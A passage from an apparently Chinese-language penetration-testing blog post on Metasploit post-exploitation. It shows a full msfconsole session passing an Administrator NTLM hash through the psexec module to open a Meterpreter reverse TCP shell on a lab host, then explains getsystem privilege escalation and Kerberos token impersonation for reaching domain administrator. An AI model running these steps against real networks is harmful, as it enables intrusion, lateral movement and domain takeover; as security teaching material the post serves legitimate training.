<h4 id="0x02传递哈希值"><strong>0x02传递哈希值</strong></h4>

<p>提取到明文密码，不能将明文密码的时候，可以进行哈希传递技术。使用<code class="highlighter-rouge">use exploit/windows/smb/psexec</code>进行哈希值传递入侵机器。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">ms08_067_netapi</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">exploit</span><span class="o">/</span><span class="nx">windows</span><span class="o">/</span><span class="nx">smb</span><span class="o">/</span><span class="nx">psexec</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">payload</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">payload</span> <span class="o">=&gt;</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">meterpreter</span><span class="o">/</span><span class="nx">reverse_tcp</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">RHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">LHOST</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.133</span>
<span class="nx">LHOST</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.133</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">SMBPASS</span> <span class="nx">f0d412bd764ffe81aad3b435b51404ee</span><span class="p">:</span><span class="mi">209</span><span class="nx">c6174da490caeb422f3fa5a7ae634</span>
<span class="nx">SMBPASS</span> <span class="o">=&gt;</span> <span class="nx">f0d412bd764ffe81aad3b435b51404ee</span><span class="p">:</span><span class="mi">209</span><span class="nx">c6174da490caeb422f3fa5a7ae634</span>

<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">SMBUser</span> <span class="nx">Administrator</span>
<span class="nx">SMBUser</span> <span class="o">=&gt;</span> <span class="nx">Administrator</span>
<span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">psexec</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.133</span><span class="p">:</span><span class="mi">4444</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Connecting</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">server</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Authenticating</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">445</span> <span class="k">as</span> <span class="nx">user</span> <span class="s1">'Administrator'</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Selecting</span> <span class="kr">native</span> <span class="nx">target</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Uploading</span> <span class="nx">payload</span><span class="p">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Created</span> <span class="err">\</span><span class="nx">mSgcBSlM</span><span class="p">.</span><span class="nx">exe</span><span class="p">...</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span> <span class="nx">Service</span> <span class="nx">started</span> <span class="nx">successfully</span><span class="p">...</span>

</code></pre></div></div>

<blockquote>
  <p>若成功入侵某大型网络中的一台主机，在多数情况下，这台主机的管理员账号与域中其他大部分系统的应该一样。这样就无须破解密码，就能实现从一个节点到另外一个节点的攻击。
<img src="/img/hack/Metasploit/1488787439207.png" alt="Alt text" /></p>
</blockquote>

<h4 id="0x03权限提升"><strong>0x03权限提升</strong></h4>

<p>获得目标系统的访问权限，可以通过<code class="highlighter-rouge">net user</code>创建限制权限的普通用户账户，然后进行提权。</p>

<ul>
  <li>输入<code class="highlighter-rouge">use priv</code>加载priv扩展，以便访问某些特权模块。</li>
  <li>输入<code class="highlighter-rouge">getsystem</code>尝试将权限提升到本地系统权限或者管理员权限</li>
  <li>输入<code class="highlighter-rouge">getuid</code>命令来检查获取的权限等级。当返回Server username: NT AUTHORITY\SYSTEM就意味着获得管理员权限。</li>
</ul>

<h3 id="令牌假冒">令牌假冒</h3>

<p>获取目标系统中的Kerberos令牌，将其用于身份认证环节，假冒当初创建这个令牌的用户。令牌假冒是Meterpreter最强大的功能之一。</p>

<p>若对某阻止进行渗透，成功入侵了系统并建立了一个Meterpreter终端，而域管理员用户在13小时内登录过该机器。在该用户登入机器的时候，一个Kerberos令牌将发送到服务器上(进行单点登录)并将在随后的一段时间之内有效。这样就可以使用该活动令牌入侵系统，通过Meterpreter可以假冒成域管理员的角色，而不需要破解他的密码，然后就可以去攻击域管理员，甚至是域控。这可能是获取系统访问最简单的方法。</p>

        </article>
        <hr>

        
        
            
            
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/27/open-RDP/">开启RDP
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/06/10/compile-and-link/">编译和链接</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2017/06/17/use-windows-link-file-to-attack/">CVE-2017-8464 LNK 远程代码执行漏洞</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/06/17/Metasploit/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/06/17/Metasploit/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
